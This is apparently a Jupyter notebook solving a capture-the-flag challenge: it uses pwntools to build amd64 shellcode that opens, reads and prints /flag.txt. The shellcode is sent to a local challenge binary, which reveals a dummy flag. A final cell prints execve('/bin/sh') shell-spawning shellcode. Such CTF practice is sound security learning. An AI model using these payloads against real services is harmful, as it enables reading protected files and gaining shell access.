In [4]:
from pwn import asm, context, shellcraft, disasm

In [5]:
context.arch = 'amd64'
context.os = 'linux'

In [6]:
print(shellcraft.open("/flag.txt"))

    /* open(file='/flag.txt', oflag=0, mode=0) */
    /* push b'/flag.txt\x00' */
    push 0x74
    mov rax, 0x78742e67616c662f
    push rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push SYS_open /* 2 */
    pop rax
    syscall



In [7]:
print(shellcraft.read("rax", "rsp", 0x100))

    /* call read('rax', 'rsp', 0x100) */
    mov rdi, rax
    xor eax, eax /* SYS_read */
    xor edx, edx
    mov dh, 0x100 >> 8
    mov rsi, rsp
    syscall



In [8]:
print(shellcraft.write(1, "rsp", 0x100))

    /* write(fd=1, buf='rsp', n=0x100) */
    push 1
    pop rdi
    xor edx, edx
    mov dh, 0x100 >> 8
    mov rsi, rsp
    /* call write() */
    push SYS_write /* 1 */
    pop rax
    syscall



In [9]:
code = shellcraft.open("/flag.txt")
code += shellcraft.read("rax", "rsp", 0x100)
code += shellcraft.write(1, "rsp", "rax")
bin = asm(code)
print(disasm(bin))

   0:   6a 74                   push   0x74
   2:   48 b8 2f 66 6c 61 67 2e 74 78   movabs rax, 0x78742e67616c662f
   c:   50                      push   rax
   d:   48 89 e7                mov    rdi, rsp
  10:   31 d2                   xor    edx, edx
  12:   31 f6                   xor    esi, esi
  14:   6a 02                   push   0x2
  16:   58                      pop    rax
  17:   0f 05                   syscall
  19:   48 89 c7                mov    rdi, rax
  1c:   31 c0                   xor    eax, eax
  1e:   31 d2                   xor    edx, edx
  20:   b6 01                   mov    dh, 0x1
  22:   48 89 e6                mov    rsi, rsp
  25:   0f 05                   syscall
  27:   6a 01                   push   0x1
  29:   5f                      pop    rdi
  2a:   48 89 c2                mov    rdx, rax
  2d:   48 89 e6                mov    rsi, rsp
  30:   6a 01                   push   0x1
  32:   58                      pop    rax
  33:   0f 05            

In [10]:
from pwn import process
conn = process("handout/chal")
conn.sendline(bin)
print(conn.recvall().decode())

[x] Starting local process 'handout/chal'
[+] Starting local process 'handout/chal': pid 37635
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 61B
[+] Receiving all data: Done (61B)
[*] Process 'handout/chal' stopped with exit code -11 (SIGSEGV) (pid 37635)
paca?
paca!
Alpaca{this_is_dummy_flag_located_at_/flag.txt}




In [11]:
print(shellcraft.sh())

    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall

